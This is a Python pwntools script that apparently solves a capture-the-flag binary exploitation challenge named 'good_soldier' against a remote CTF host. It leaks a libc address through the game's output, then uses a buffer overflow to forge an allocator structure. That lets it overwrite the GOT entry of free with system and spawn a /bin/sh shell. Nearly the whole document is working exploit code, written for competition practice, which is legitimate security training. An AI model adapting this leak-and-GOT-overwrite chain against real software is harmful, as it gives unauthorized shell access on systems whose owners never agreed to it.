#!/usr/bin/env python3

from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.binary = elf = ELF('../src/build/good_soldier')
context.log_level = 'error'


if args.REMOTE:
    libc = ELF('../infra/libc.so.6')
    HOST = "good-soldier-136.chall.ctf.bzh"
    PORT = 1337
    io = remote(HOST, PORT)
else:
    libc = elf.libc
    gs = """
    b *game_instance+406
    continue
    """
    io = gdb.debug(elf.path, gdbscript=gs, cwd="../src/") if args.GDB else process(cwd="../src")


# STEP 1 : Get libc leak using goofy ass leak
# We keep on playing until the leak triggers !
# Note that it is also possible to predict the seed and thus prepare a payload that will get it for sure

io.sendlineafter(b'> ', b'foobar')
while True:
    io.sendlineafter(b'> ', b'1')
    io.recvuntil(b'You attack the enemy and makes him lose 25 HP !!\n')
    potential_leak = io.recvline()
    if b'0x' in potential_leak:
        leak = int(potential_leak.split(b': ')[1], 16)
        libc.address = leak - libc.sym["puts"]
        print("libc @ " + hex(libc.address))
        break

    io.sendlineafter(b'...', b'')
    io.recvline()
    test = io.recvline()
    if b'You lose' in test or b'You win' in test:
        io.sendlineafter(b'> ', b'dont care')
        io.sendlineafter(b': ', b'foobar')
        io.sendlineafter(b'?', b'y')
        io.sendlineafter(b'> ', b'foobar')

# STEP 2 : Use the overflow to rewrite the memory allocator 
io.sendlineafter(b'...', b'')
io.recvline()
test = io.recvline()
if not b'You lose' in test and not b'You win' in test:
    io.sendlineafter(b'> ', b'2')

offset_arena = 256
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
free_got = elf.got["free"]

# We want arena_alloc to return free_got
# signature = base + cursor = free_got
# And we want free(base) to be system("/bin/sh")
# So base = binsh, and cursor = free_got - binsh
cursor = (free_got - binsh) & 0xffffffffffffffff
capacity = (cursor + 100) & 0xffffffffffffffff
fake_arena = p64(binsh) + p64(cursor) + p64(capacity)

payload = b'A' * offset_arena + fake_arena

io.sendlineafter(b'> ', payload)
io.sendlineafter(b': ', p64(system))

io.interactive()
